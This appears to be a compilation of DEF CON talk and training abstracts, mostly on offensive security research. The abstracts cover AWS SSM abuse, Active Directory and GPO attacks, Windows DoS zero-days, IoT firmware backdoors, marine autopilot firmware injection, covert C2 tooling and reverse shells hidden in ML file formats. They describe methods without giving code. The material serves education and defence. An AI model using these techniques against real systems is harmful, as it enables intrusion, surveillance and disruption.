<p>Four years ago, Chris found a vulnerability with a murder for hire site on the dark net. He could exploit that vulnerability to intercept the murder orders that were being placed: names, addresses, pattern of life information, photos, and, in some cases, bitcoin payments. He reached out to Carl for help, and a small team was built in secret to intercept and triage these orders. However, after their warnings to the police fell on deaf ears, they ultimately decided to warn the targets on the kill list directly. After an initial series of successes, the investigation expanded rapidly and they formed a global cooperation with the FBI and police forces around the world, resulting over 175 murder orders being disclosed, 34 arrests 28 convictions and over 180 years of prison time being sentenced. This talk will be about those years: about the dangers and threats the team had to navigate, the times of isolation when the police wouldnât take them seriously, about raids in Romania to uncover the cyber-criminal gang running the site and the psychological impact of racing against time to try to stop people getting murdered.</p>

<p>Satellites are constantly orbiting the planet and beaming information back to us. Some of the most interesting information is weather images. As it turns out, it is very easy and cheap to pick up those signals and get a real-time view of your current location. In this talk I will go over what is out there, what you need to get, and the open source software stack to generate amazing images.</p>

<p>Some of the earliest weather satellites were launched in the 50's. Since that time, technology has come a long ways from simple images of clouds, with new payloads that can see through the clouds and give information like ocean wave heights, ground temperatures, wind speed and direction, and other interesting information.</p>

<p>The even better part of this is that all this information is being sent in the clear, continuously, meaning if you can receive it and decode it, you can view and use the data. Be your own weather forecaster! Hardware needed to accomplish this is as simple as a dipole antenna on a tripod and a $30 SDR dongle.</p>

<p>On the software side, there are many different programs you can use to collect the signal. Some, like SatDump, even do everything all in one place: tune, decode, and assemble the output all in a single click. It's even possible to setup a schedule and fully automate collecting imagery.</p>

<p>Moving beyond the simple APT data, you can get even higher resolution data if you build a simple dish antenna. While it is entirely possible to just hand-hold the antenna with a cell phone strapped to the back to show you where to point, it's just as easy to buy a cheap used dish rotator and have the same software automatically track it for you.</p>

<p>Once you get into decoding weather data, it's just a simple hop, skip and a jump to learning how to send signals to amateur radio satellites or even the ISS. And all you need is a Technician license!</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Operational Technology (OT) describes devices and protocols used to control
real-world operations: factories, assembly lines, medical equipment, and so on.</p>

<p>For decades, this technology was isolated (more or less) from the wider world,
using custom protocols and communications media. However, over the past 15 - 20
years, these devices have started using commodity protocols and media more and
more. This means that these devices are now using the standard TCP/IP protocol
suite, a concept referred to as ""OT/IT convergence.""</p>

<p>This convergence has obvious benefits, making these devices cheaper and more
manageable. However, it also makes them more accessible to attackers, and their
security posture has often not kept up.</p>

<p>As part of this convergence process, many devices are connected via protocol
gateways. These gateways speak TCP/IP, and then translate communications to
proprietary OT protocols (or simply provide a NAT-style private network within
an OT device rack).</p>

<p>This talk discusses techniques for detecting devices on the ""other side"" of
these gateways. It begins with a brief introduction to the history of OT,
moving on to the OT/IT convergence phenomenon. It then discusses the issue of
protocol translation and provides two practical examples of discovering assets
across gateways: CIP (Common Industrial Protocol) message forwarding and DNP3
(Distributed Network Protocol, version 3) address discovery.</p>

<p>These techniques are provided as examples to illustrate the issue of OT device
discovery, and to encourage the audience to perform further research in how
these sorts of devices may be discovered on networks and, ultimately, protected.</p>

<p>IoT devices are ubiquitous, yet their security remains a critical concern. This talk explores over 50 real-world vulnerability cases in the IoT ecosystem, exposing systemic issues such as vendor-embedded backdoors, predictable credentials, and exploitable configuration consoles. Weâll dissect vulnerabilities like CVE-2024-48271 (CVSS 9.8) and CVE-2025-1143, favored by APT groups and scammers, that enable remote code execution and global device control. Drawing from our extensive research, weâll reveal how even beginners can compromise critical infrastructure like ATMs and water treatment facilities by targeting poorly secured devices. Additionally, weâll share the frustrating reality of reporting vulnerabilities to manufacturers, CNAs, and CERTsâstories of ignored reports, year-long delays, and denials despite severe risks. Attendees will gain actionable insights into vulnerability discovery, secure development practices, and responsible disclosure, empowering hackers, developers, and manufacturers to strengthen IoT security.</p>

<p>For those who find it hard to dive into something new alone, we will be offering small tour groups to take people around to various villages, contests and communities. We will meet in the LVCC West Hall - South Entrance, look for the butterfly logo banner! We will then leave for the village/contest/event/community as a group, hang out there for 15 minutes or so, and then you may choose to return to the lobby with the group or stay in the village. We are NOT members of where we are going to tour, we are all finding out about the cool things at DEF CON together.</p>

<p>Lots of us can look back on a time in our IT or cybersecurity careers and think about a select person or group of people that helped us immensely when we were younger to get on the right track. However, there are others that may not have had that opportunity to have a mentor or community instill a purpose in the world of tech. Making these communities or finding a good mentor can be a difficult task for many of us, so we wanted to host a discussion panel to discuss the various methods that we have been able to utilize.</p>

<p>Our major goal is to give back to the communities that helped us grow in our careers and personal lives. At our school district weâve been very fortunate to build a culture of learning, security, and community. Weâve been able to successfully start and grow various clubs and opportunities for students to learn cool things with like minded people. In the panel we will talk about growing student helpdesk programs, eSports clubs, creating a tech savvy culture, and much more. Please come join us, bring questions, bring your experiences, and letâs help each other build up the next generation of hackers!</p>

<p>Purple Teaming has become a critical component of modern cybersecurity programs, but its definition and application vary widely across organizations. This presentation introduces a refined, regimented, and repeatable methodology for running Purple Team engagements, developed and battle-tested for over a decade.
As the term 'Purple Team' means different things to different peopleâ a methodology, a team of people, a program, an assessment, or even a state of mindâand as Purple Team engagements themselves come in all shapes and sizes, the speaker will begin by aligning recommended definitions and applications of common Purple Team terminology.
The presentation will explain how to apply an Assumed Compromise approach to Purple Teams. Any organization can be vulnerable at any point in time. This style of Purple Team testing follows the adversary through the entire life cycle of an attack, from Initial Access to Impact, assuming vulnerabilities exist to instead focus on the visibility of security tools. This is a powerful method of identifying ways to improve detection and prevention capabilities at each layer of an organizationâs defense in depth. The speaker will include real world examples and specific instructions.
The presentation will conclude with broader applications of this style of Purple Team. This will include how to collect and analyze the engagement results and apply these results to drive improvement to an organizationâs resilience to common threats.
This talk is ideal for security professionals, both Red and Blue Team, who are looking to elevate the way they perform Purple Team engagements.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>In 2020, Jazmine Sullivan instructed us to unapologetically move on from the things that do not serve us. While toxic professional relationships can fall into that category, the underlying unjust baggage and biased perspectives of cybersecurity professionals are equally damaging as they can lead to poor and untimely decision-making. Consequences include investing in unnecessary or inadequate security controls, limiting talent acquisition sources, and not soundly understanding your attack surface. </p>

<p>This presentation will review the logical fallacies and cognitive biases that manifest in cyber threat intelligence (CTI) and the adverse outcomes they introduce. It will then explore structured analytic techniques that analysts and leaders can apply to move beyond biases and objectively assess threats. Finally, the presentation will draw parallels between subjectivity and its unfavorable effects on holistic threat assessments and the oppressive attacks on diversity, equity, and inclusion programs throughout 2025, which are highly likely to introduce disparity in cybersecurity and the broader information technology field. After attending this talk, the audience will understand how bias can negatively affect CTI analysis and reporting and misguide cybersecurity judgments and strategy, impacting attendees' ability to identify, articulate, and correct concerns regarding subjective practices. Attendees will also learn how biases in recruiting and decision-making can adversely affect the cybersecurity of their respective organizations.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>AWS Systems Manager (SSM) is a powerful service for managing and automating your AWS and hybrid infrastructure. However, its very flexibility can be weaponized by attackers seeking to gain unauthorized access, execute malicious code, establish persistence, and disrupt operations. This talk demonstrates the practical malicious use of various SSM features, revealing how attackers can abuse benign functionalities.   </p>

<p>We will dissect distinct attack vectors targeting SSM capabilities. Learn how Run Command can be leveraged for remote code execution at scale, turning your management tool into an attacker's playground. We'll explore the alarming potential of the SSM Agent being exploited as a persistent Remote Access Trojan (RAT), enabling stealthy cross-account control. Discover the risks lurking within publicly shared SSM Documents, exposing sensitive information to unintended eyes.</p>

<p>The session will further illuminate how Parameter Store, designed for secure configuration management, can be poisoned to compromise application logic and secrets. Understand how State Manager, intended for maintaining consistent configurations, can be twisted to establish persistent malicious states. We will also dissect the abuse of Session Manager for unauthorized interactive shell access, bypassing traditional network security controls and boundaries. The often-overlooked Patch Manager will be examined for its potential to disrupt patching cycles or, in specific scenarios, introduce malicious changes. Finally, we will explore how Distributor, a tool for software deployment, can be exploited to introduce and maintain a foothold of malicious packages across your fleet.</p>

<p>Crucially, this talk goes beyond simply identifying vulnerabilities. We will provide concrete and actionable hardening techniques and mitigation strategies for each abuse vector. Learn how to implement the principle of least privilege across SSM IAM permissions, establish robust monitoring and alerting mechanisms, and implement secure configuration practices for the Parameter Store and State Manager.</p>

<p>Attendees will understand the often-underestimated security risks associated with AWS SSM and acquire practical knowledge to fortify their AWS environments against these potential exploits. This session is essential for security professionals, cloud architects, DevOps engineers, and anyone responsible for the security and operational integrity of AWS infrastructures.</p>

<p>Outline with techniques we are going to present and discuss :
1. Abusing Run Command for Remote Code Execution:
2. Exploiting SSM Agent as a Remote Access Trojan (RAT)
3. Abusing Publicly Shared SSM Documents
4. Leveraging Parameter Store for Configuration Poisoning
5. Abusing State Manager for Persistent Configuration Drift
6. Abusing Session Manager for Unauthorized Interactive Access
7. Exploiting Patch Manager for Inconsistent or Malicious Patching
8. Weaponizing Software Distribution: Abusing AWS SSM Distributor</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>SESNSploit is a dedicated red team exploitation tool targeting AWS Simple Email Service (SES) and Simple Notification Service (SNS) misconfigurations. While existing frameworks like Pacu offer minimal or no coverage for these services, SESNSploit fills this gap by providing comprehensive attack scenarios. This includes enumerating regions, listing topics and identities, sending unauthorized emails or messages, and simulating misconfiguration exploitation. The tool is designed for red teamers, security researchers, and cloud security professionals to assess and identify potential security weaknesses in AWS SES and SNS setups.</p>

<p>We have added few of the following key features: </p>

<ul>
<li><p>Enumeration of active SES and SNS regions.</p></li>
<li><p>Identification of SES identities and SNS topics.</p></li>
<li><p>Unauthorized message and email sending simulations.</p></li>
<li><p>Menu-driven interface for easy navigation.</p></li>
<li><p>Supports state-saving for efficient testing and resumption.</p></li>
</ul>

<p>SESNSploit offers functionalities that major AWS exploitation frameworks like Pacu currently lack. It specifically focuses on SES and SNS, which are often overlooked in security assessments but can be critical entry points if misconfigured.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The implementation of Active Directory environments is, by essence, not unlike a command-and-control infrastructure allowing to centrally coordinate and control network assets. As an attacker, why not make it your own ?</p>

<p>As far as the C2 capabilities of Active Directory go, Group Policy Objects (GPOs) are a key functionality that can be leveraged by attackers for a surprisingly wide range of offensive actions. From enumeration, to persistence, to impactful privilege escalation in mature segmented environments, abusing GPOs amounts to abusing the C2 capabilities of Active Directory itself â a powerful attack primitive.</p>

<p>And yet, GPOs received comparatively little attention by the pentesting and research community. GPOs exploitation knowledge and tooling is scarce, whether because implementation may seem kind of obscure, or since exploitation can be seen as risky. Concerns that well-equipped attackers may not have to worry about.</p>

<p>This presentation aims at demonstrating the full extent of possibilities offered by Group Policy Objects. It will dive deep into GPOs implementation, enumeration potential and advanced exploitation techniques introduced or implemented by the speakers these last few years. It will also be accompanied by the release of two enumeration and exploitation tools developed by the speakers.</p>

<p>DCs are organizationsâ core. A successful DoS attack against them can break authentication and paralyze operations.</p>

<p>Following our LdapNightmare release, the first public DoS exploit for CVE-2024-49113, we found two new DoS-style attack surfaces on DCs: new critical DoS vulnerabilities, and creating a botnet harnessing public DCs for DDoS. Our goal: create the Win-DoS epidemic - infect DCs with Win-DoS and make them infect others, forming Win-DDoS.</p>

<p>Building on LDAPNightmare, we explored client-side targeting, often exposing weaker code. By turning DCs into LDAP clients via NetLogon RPC, using LDAP referrals, we redirected them to chosen domains/ports, matching our goals.</p>

<p>Moreover, we knew DDoS was powerful, but aimed to replicate its effect from a single machine. We focused on RPC servers - abundant in Windows with wide attack surfaces, especially those not requiring authentication. By abusing security gaps in RPC bindings, we hit the same RPC server relentlessly from one system, far surpassing standard concurrency limits! and WOW, found vulns crashing any Windows: servers and endpoints alike!</p>

<p>We present âWin-DoS Epidemicâ - DoS tools exploiting four new Win-DoS and one Win-DDoS zero-click vulns! Crash any Windows endpoint/server, including DCs, or launch a botnet using public DCs for DDoS. The epidemic has begun</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>With billions of users worldwide, mobile messaging apps like WhatsApp and Signal have become critical for personal and professional communication. While these platforms promise security and privacy, our research uncovers two significant vulnerabilities that expose users to stealthy tracking and security degradation.</p>

<p>First, we reveal how delivery receipts --commonly used to confirm message delivery-- can be exploited to track a user's online status, screen activity, and device usage without their knowledge. This technique enables passive surveillance, draining a target's battery and data allowance while remaining entirely invisible to them.</p>

<p>Second, we demonstrate a novel attack on WhatsApp's implementation of the Signal Protocol, specifically targeting its Perfect Forward Secrecy (PFS) mechanism. By depleting a victim's stash of ephemeral encryption keys, an attacker can weaken message security, disrupt communication, and exploit flaws in the prekey refilling process.</p>

<p>Both attacks require nothing more than the victim's phone number and leverage fundamental design choices in these widely used platforms. </p>

<p>This talk will provide an in-depth analysis of these vulnerabilities, their implications, and potential mitigations -- challenging the security assumptions of modern encrypted messaging.</p>

<p>godman666 has operated in the darknetâs criminal underbelly for over a decade. Starting with carding at 16, he moved to spam operations before rising through Silk Road and Tor carding forums. He built phishing empires, sold hacking tools, and ran infrastructure for major marketsâincluding engineering the darknetâs largest phishing operation after a fallout with Empire Marketâs staff. A backend role at a top market later ended in financial sabotage (ask about Christmas 2019).

<p>And we are not prepared.</p>

<p>Prior to the Colonial Pipeline incident in 2021, we focused on protecting against state adversaries.</p>

<p>Afterwards, we shifted to focusing on protecting against ransomware operators and hacktivists.</p>

<p>Now in 2025, we see more alignment between state adversaries, ransomware operators and hacktivists.</p>

<p>A significant shift in the landscape we are not ready for.</p>

<p>Advanced capabilities and tools in the hands of every day attackers with intermediate to no skill?</p>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>The rapid proliferation of consumer IoT devices has introduced new attack vectors beyond traditional exploitation. One overlooked risk lies in firmware persistence in returned devicesâan issue that could enable mass surveillance, botnet propagation, or backdoor persistence at scale. This research investigates whether major retailers properly reset IoT firmware before reselling returned products, exposing critical gaps in supply chain security.</p>

<p>In this experiment, commercial IoT devices are purchased, modified with custom firmware embedding a simple callback, and then returned to the store. The devices are later repurchased and analyzed to determine if retailers performed proper firmware resets or if malicious code remained intact.
Findings from this research reveal inconsistencies in retailer sanitization policies, with some major retailers failing to properly wipe and reflash firmware before resale. This talk will demonstrate examples of persistent firmware modifications, discuss the potential for IoT-based supply chain attacks, and propose real-world mitigation strategies for manufacturers, retailers, and consumers.</p>

<p>Attendees will leave with a deeper understanding of how IoT firmware sanitization failures create a new class of attack vectorsâand how threat actors could exploit this to build persistent IoT botnets, data-exfiltration implants, or unauthorized surveillance tools.</p>

He's a Senior Penetration Tester at Happening, he discovered 9 CVEs and loves hacking at scale. In this talk, ""Smart Devices, Dumb Resets? Testing Firmware Persistence in Commercial IoT"", Matei reveals how threat actors can implant persistent backdoors in smart devices, then return them for resale through legitimate retailers. Because factory reset processes often fail to wipe firmware-level compromises, attackers can exploit the trust users place in brand-name resellersâturning returned devices into credible, persistent attack vectors.</p>

<p>We demonstrate a vulnerability in a commonly-used autopilot computer that allows unsigned firmware to be pushed through trusted update channels such as SD cards and NMEA 2000 networked chart plotters without authentication or cryptographic validation. We show how a malicious â.swupâ file can be crafted and accepted by the system to gain persistent code execution, enabling arbitrary CAN bus injection on marine control networks. The attack chain, reminiscent of removable media-style delivery in air-gapped systems, demonstrates how firmware-level control in marine environments can be leveraged to disrupt navigation subsystems. We will walk through firmware extraction, reverse engineering of firmware and CAN subroutines, firmware repackaging, and live effects on NMEA 2000 networks. No physical access to the autopilot is needed, the attack leverages trusted firmware delivery via the chart plotter over NMEA 2000.</p>

<p>For those who find it hard to dive into something new alone, we will be offering small tour groups to take people around to various villages, contests and communities. We will meet in the LVCC West Hall - South Entrance, look for the butterfly logo banner! We will then leave for the village/contest/event/community as a group, hang out there for 15 minutes or so, and then you may choose to return to the lobby with the group or stay in the village. We are NOT members of where we are going to tour, we are all finding out about the cool things at DEF CON together.</p>

<p>Modern processors are built for speed, but in doing so, they make dangerous assumptions.
The very features that make processors fast can also make them untrustworthy.
This talk explores how features like speculative and out-of-order execution open the door to powerful side-channel attacks like Spectre and Meltdown.
Youâll learn how these vulnerabilities allow attackers to read privileged memory, bypass isolation, and leak secrets that should never be exposed.
Through clear explanations and live demonstrations, weâll show how trust in hardware can be misplaced and how those lies can be turned into exploits.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Letâs face it â traditional HTTP C2 is burning out. Between aging domains, TLS cert management, sandbox fingerprinting, and blue teams getting smarter at categorizing traffic and infrastructure, your âcustom C2â feels less covert and more like a liability. Red teams and threat actors alike are shifting toward living off legitimate services â AWS, GitHub, Box, Notion, whatever blends in â but building solutions that are custom to a single C2 framework? Letâs stop doing that. Letâs share the fun!</p>

<p>C4 (Cross-Compatible Command &amp; Control) is here to change that. Itâs a modular toolkit of WASM-powered plugins that makes external C2 easy to implement, regardless of your implant's language or target OS. Whether youâre writing in C, Rust, Go, Python, C#, or something else entirely, C4 plugins can be loaded directly into your implant and run on Windows, macOS, or Linux.</p>

<p>But the real game-changer? C4 provides a single, centralized collection of numerous fully-documented, operationally-ready external C2 modules â not just proof-of-concepts, but production-level integrations with trusted sites that fly under the radar. No more hunting through GitHub repos, hand-rolling fragile API calls, or hacking together glue code for every new environment.</p>

<p>Stop reinventing external C2 and start planting some C4 in your implants!</p>

<p>Microsoft Configuration Manager, better known as SCCM, has become my go-to target for red team operations. While multiple attack paths were uncovered recently, companies still struggle to close all security gaps. This is largely due to the solution's complexity and historical technical debt, which make it challenging to effectively address and mitigate all security vulnerabilities. Moreover, as it primarily manages computers, taking over an SCCM deployment often leads to the full compromise of the Active Directory, with less hassle than traditional attack paths.</p>

<p>In this talk, I'll be sharing insights gained from my research on the solution that led to the discovery of multiple 0 Day vulnerabilities, such as CVE-2024-43468, an unauthenticated SQL injection. After introducing key concepts, I'll delve into various techniques for performing reconnaissance, tips for understanding the hierarchy and tricks for bypassing certain security boundaries. The session will also cover the discovered vulnerabilities that can lead to the compromise of the deployment.</p>

<p>After showcasing post-exploitation techniques from database access, I'll introduce a battle-tested open-source tool that implements them. And for those interested in persistence, a technique for installing a backdoor as a legitimate servicing endpoint will be shared.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Dealers are a vital part of the automotive industry â intentionally separate entities from the manufacturers, but highly interconnected. Most dealers use platforms built by the manufacturers that can be used to order cars, view/store customer information, and manage their day-to-day operations. Earlier this year, new vulnerabilities were discovered in a top automakerâs dealer platform that enabled the creation of a national admin account. This level of access, a privilege reserved for a select few corporate users, opened the door to a wide range of fun exploits.</p>

<p>Want to start a car? Forget VINs â all you needed was someoneâs name. Access to the enrollment systems made it possible to reassign ownership of cars and access remote control functionality.</p>

<p>Want to find out who owns that sleek ride next to you? A quick glance at the VIN on the windshield was all you needed to pull down the ownerâs personal information using the customer lookup tool.</p>

<p>Want to impersonate the owner of a dealership to gain full access to everything? A user impersonation function was uncovered that made this possible - negating all the two-factor authentication systems.</p>

<p>All of this and much more was made possible through API flaws in a centralized dealer system. A system used by more than 1,000 dealers in the USA that you didnât even know existed. A system that you would never have thought would be the unexpected connection to your car. We break down the full exploit from recon to initial access, from viewing PII to the satisfying roar of an engine coming to life.</p>

<p>En esta charla exploraremos cÃ³mo acelerar el cÃ¡lculo de funciones hash, centrÃ¡ndonos especialmente en el uso de dispositivos reconfigurables como las FPGAs. Comenzaremos con una introducciÃ³n a las funciones hash, su papel fundamental en criptografÃ­a y seguridad informÃ¡tica, y sus propiedades clave como la irreversibilidad y la resistencia a colisiones.<em>x000D</em>
<em>x000D</em>
A continuaciÃ³n, haremos un repaso comparativo de las distintas plataformas de cÃ³mputo donde se pueden implementar algoritmos hash: CPU, GPU, ASIC y FPGA, analizando sus ventajas, limitaciones y casos de uso tÃ­picos. Nos detendremos especialmente en las FPGAs (Field-Programmable Gate Arrays), explicando su arquitectura, su capacidad de paralelismo masivo y su flexibilidad para implementar lÃ³gica especÃ­fica.<em>x000D</em>

<p>Everyone knows not to trust pickle files, but what about .onnx, .h5, or .npz? This talk explores how trusted file formats used in AI and large language model workflows can be weaponized to deliver reverse shells and stealth payloads. These attacks rely solely on the default behavior of widely used machine learning libraries and do not require exploits or unsafe configuration.</p>

<p>The presentation focuses on formats that are not typically seen as dangerous: ONNX, HDF5, Feather, YAML, JSON, and NPZ. These formats are commonly used across model sharing, training pipelines, and inference systems, and are automatically loaded by tools such as onnx, h5py, pyarrow, and numpy. A live demo will show a healthcare chatbot executing code silently when these formats are deserialized, with no user interaction and no alerts. This is a demonstration of how trusted data containers can become malware carriers in AI systems. Attendees will leave with a clear understanding of the risks introduced by modern ML workflows, and practical techniques for payload delivery, threat detection, and hardening against this type of tradecraft.</p>

<font size=""+1""><strong>Tags:</strong></font> DEF CON Official Talk | Demo ð»<br>
<font size=""+1""><strong>When:</strong></font> Sunday, Aug 10, 14:00 - 14:20 PDT<br>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>Anticounterfeiting is an obscure and private world. Companies tightly hold their secrets and rely heavily on security through obscurity. But banknotes and government IDs arenât the only targets of counterfeiting. Live events are increasingly targeted as ticket prices increase. The fast moving and dynamic nature of live events makes both counterfeiting and anticounterfeiting a more complex challenge. The limited time before the event ends is a key defense for event producers. </p>

<p>But with a basic mix of social engineering, arts and crafts, and keen observation most of these credentials can be defeated using DIY techniques. Even advanced measures like UV ink or holograms can be defeated or avoided with techniques you might have learned in art class. But while copying a credential seems easy enough, there are numerous mistakes that would-be counterfeiters make. </p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Since our sold out class in 2024, we have refreshed the material to incorporate not only Agentic AI but Content Augmentation Generation (CAG)!</p>

<p>Have you ever wondered how the pros use AI to solve their complex cybersecurity problems? Come find out!</p>

<p>Artificial Intelligence (AI) and Large Language Models (LLMs) have emerged as robust and powerful tools that have redefined how many approach problem solving. The last few years have seen industry AI interest surge while Cybersecurity experts struggle not only to threat model LLMs but to leverage them effectively. Our training presents a comprehensive educational framework aimed at equipping students with the necessary skills to not only build their own LLM toolkits but to leverage AI and LLMs to build elegant solution to solve complex problems unique to their own environments.</p>

<p>This class will teach students how to build their own AI frameworks to ingest data from either SaaS or on-prem data lakes. We will provide both the tools for data data consumption but as well as data warehousing. From there we will walk students through transforming this data and making it operationally effective and efficient for their AI. We will cover various types of data common to Cybersecurity environments, protentional issues with certain data types, and how to make the most of opensource to help transform the data. We will also touch on training and LoRA for model customization.</p>

<p>As Cybersecurity experts, we also need to understand the risk that comes with the use of AI. For this purpose, we will discuss foundational knowledge to conduct both red and blue team exercises regarding AI. We will discuss risk analysis of the disparate components used to make AI functional, a holistic and functional approach to defending the supply chain, understanding vulnerability analysis, and modern day adversary attacks and techniques that you will encounter. Understanding modern security policy frameworks is just as important and we will cover a few of the popular frameworks used to secure and apply policy to your AI environment. We will cap this section of class off with a practicum of both attacking and defending our AI deployed in class.</p>

<p>Using the tools created in class, we will use the SOCMAN DEF CON model to solve hand-picked operational problems we have seen teams struggle with all over the world. You will learn how to use LLMs with agentic AI, how to augment our queries with our own data in two different methods (RAG/CAG), generate high quality YARA/SIGMA rules using your own data, tune your model to hunt complex patterns, improve application observability by adding context to ""weird"" behavior, how to hunt for APTs using real world scenarios and logs (Stuxnet), filter out noise to increase signal in your environment (SNR), and much more! All of these labs will be performed by students and will leverage AI as middleware to add contextual data between disparate platforms to solve your complex cybersecurity problems. All use cases will be performed by students live and in-class.</p>

<p>By the end of this training you will be able to:</p>

<ul>
<li>Build their own AI-powered cybersecurity framework, including custom tooling, ingestion pipelines, and LLM orchestration</li>
<li>Ingest and warehouse data from SaaS and on-prem sources, transforming it for AI readiness using open-source tools</li>
<li>Apply Agentic AI and Content Augmentation Generation (CAG) to real-world cybersecurity challenges</li>
<li>Select, train, and fine-tune models, including LoRA customization for environment-specific detection and automation</li>
<li>Generate high-quality YARA and SIGMA rules using real-world data and AI-assisted pattern matching</li>
<li>Augment detection logic using RAG/CAG, enhancing context-awareness and improving incident triage</li>
<li>Understand foundational knowledge to defend your AI deployments, including threat modeling, adversary simulation, and defending AI infrastructure</li>
<li>Analyze and enrich logs using AI, identify complex behavioral patterns, and detect APT activity using real-world examples like Stuxnet</li>
<li>Improve observability by adding AI-generated context to anomalous or hard-to-interpret behaviors</li>
<li>Increase signal-to-noise ratio (SNR) by using AI to reduce false positives and highlight meaningful security events</li>
<li>Solve complex cybersecurity problems!</li>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Software Defined Radios (SDRs) are a powerful tool that has made the once-obfuscated domain of the electromagnetic spectrum open to anyone with a low-cost laptop and radio. From both an offensive and defensive perspective, an enormous attack surface, with many legacy devices and protocols, is open for exploitation. SDR 101 is a course designed for cyber security professionals of all skill levels who want to start working with RF signals and SDRs.</p>

<p>This class is a beginner's introduction to practical Software Defined Radio applications and development with an emphasis on hands-on learning. If you have ever been curious about the invisible world of radio waves and signals all around you, but didn't know where to begin, then this course is for you. Students can expect to learn about basic RF theory and SDR architecture before moving on to hands-on development with real radios. Over the two-day course, the instructor will guide students through progressively more complicated RF concepts and waveforms, culminating in a small capstone exercise. Students will be provided with a HackRF SDR for the duration of the class but will need to bring their own laptop to interface with the radio. VMs will be made available to students to download before class, along with an OS setup guide for those that prefer a bare-metal install. The VM/OS will have all the required drivers and frameworks to interface with the radio hardware, allowing us to jump right into hands-on exercises. My intent for this course is to lower the barrier of entry associated with RF hacking and give beginning students a practical understanding of RF and DSP applications with SDRs.</p>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>Hackers have a unique perspective on the world and in particular on the technological artifacts within it. When most people look at a high tech system, they see what they were meant to see by the people who created it. Hackers see technology as it truly is, not as it was meant to be, and this way of looking at things enables hackers to discover possibilities that were never intended in the first place.</p>

<p>For centuries, military and intelligence strategists have sought to view the world from a similar perspective - a perspective that can see the hidden possibilities and weaknesses in things and take advantage of them to create unexpected results. </p>

<p>This unique course draws lessons from both the hacker community and from military thinking in order to deepen your ability to understand adversaries and see things the way that adversaries see them. </p>

<p>Honing this skill is particularly valuable for people who are building technological systems that might be subject to misuse and need to be able to anticipate that misuse. Whether you are an aspiring red teamer, a hardware engineer, software developer or product owner striving to understand how your product will be abused, or you work in fraud detection, risk analysis, election security, or any other domain where you face an adversary, youâll find this course a valuable addition to your skill set.</p>

<p>We willâ¦</p>

<ul>
<li>Survey adversarial thinking in a wide range of domains</li>
<li>Review the history of hacking and phone phreaking and understand how they influenced the development of a way of thinking about technology</li>
<li>Explore lock picking and physical security</li>
<li>Iteratively decompose an organization or complex system to find its most critical dependencies and develop methods of attacking those dependencies successfully</li>
<li>Consider how one might creatively steal from your employer and what controls are necessary to prevent this from happening</li>
<li>Examine how and why you might be targeted by foreign intelligence </li>
<li>Practice cheating on a test</li>
<li>Understand how the mental models we develop for how things work can prevent us from seeing how they actually work</li>
<li>See how levels of abstraction in computer technology can hide vulnerabilities</li>
<li>Learn how to read technical standards and see the things that they fail to say</li>
<li>Practice fooling your customers by offering products with unstated capabilities</li>
<li>Explore how state cyber operations are organized and could target your organization</li>
<li>Study the crowdsourcing of adversaries, as seen in Ukraine</li>
<li>Explore dangerous security assumptions</li>
<li>Investigate deception techniques</li>
<li>Practice detecting and role-playing insider threats</li>
<li>And much moreâ¦</li>
</ul>

<p>After completing the course youâll leave with:</p>

<ul>
<li>An improved offensive mindset and ability to identify weaknesses and other unintended characteristics of systems.</li>
<li>Heightened awareness of non-obvious threats and threat actors across the spectrum of the cyber, information, cognitive, and physical domains. </li>
<li>Practical tools and techniques to better assess security risk and employ security controls.</li>
<li>A deeper understanding of threat actor TTPs and countermeasures in areas such as: state-level cyberspace operations, electronic warfare and surveillance, supply chain compromise, hardware implants, deception operations, human intelligence collection, physical security, influence operations, targeting methodologies, and novel threat intelligence analytic techniques, among numerous other topics.</li>
<li>Improved critical thinking techniques via an understanding of how the world, its threat actors, and the enterprise security environment behave in practice, not how defenders assume it to be.</li>
<li>An enhanced ability to fluidly shift from the mindset of a defender into that of an attacker, and back again.</li>
<li>Diverse sources of additional information to aid participantsâ continued self-development.</li>
</ul>

<p>This interesting and fast-moving class will include hands-on exercises to apply and reinforce the skills learned. Youâll leave this course with a fresh perspective and a toolkit of techniques to better accomplish your mission. Come join us.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>More than 95% of Fortune 500 companies use Active Directory! Enterprises are managed using Active Directory (AD) and it often forms the backbone of the complete enterprise network. Therefore, to secure an enterprise from an adversary, it is inevitable to secure its AD environment. To secure AD, you must understand different techniques and attacks used by adversaries against it. Often burdened with maintaining backward compatibility and interoperability with a variety of products, AD environments lack ability to tackle latest threats.</p>

<p>This training is aimed towards attacking modern AD with focus on OPSEC and Stealth. The training is based on real world penetration tests and Red Team engagements for highly secured environments.  Some of the techniques used in the course:</p>

<ul>
<li>Introduction to OPSEC and Stealth used in the class.</li>
<li>Offensive .NET and PowerShell tradecraft</li>
<li>Extensive AD Enumeration</li>
<li>Active Directory trust mapping and abuse.</li>
<li>Privilege Escalation (User Hunting, Delegation issues, LAPS abuse, gMSA abuse, SPN Hijacking, Shadow Credentials and more)</li>
<li>Advanced Kerberos Attacks and Defense (Diamond, Golden, Silver ticket, Kerberoast and more)</li>
<li>Advanced cross forest trust abuse (Lateral movement across forest, PrivEsc and more)</li>
<li>Credentials Replay Attacks (Over-PTH, Token Replay, Certificate Replay etc.)</li>
<li>Attacking Entra ID integration (Hybrid Identity)</li>
<li>Abusing trusts for MS products (AD CS, SQL Server etc.)</li>
<li>Persistence (WMI, GPO, Domain and Host ACLs and more)</li>
<li>Monitoring Active Directory</li>
<li>Defenses (JEA, PAW, LAPS, Selective Authentication, Deception, App Allowlisting, MDE EDR, Microsoft Defender for Identity etc.)</li>
<li>Bypassing defenses (MDE, MDI and Elastic)</li>
</ul>

<p>The course is a mixture of fun, demos, exercises, hands-on and lecture. You start from compromise of a user desktop and work your way up to multiple forest pwnage. The training focuses more on methodology and techniques than tools.</p>

<p>Attendees will get free two months access to an Active Directory environment comprising of multiple domains and forests, during and after the training and a Certified Red Team Expert Exam (CRTE) certification attempt.</p>

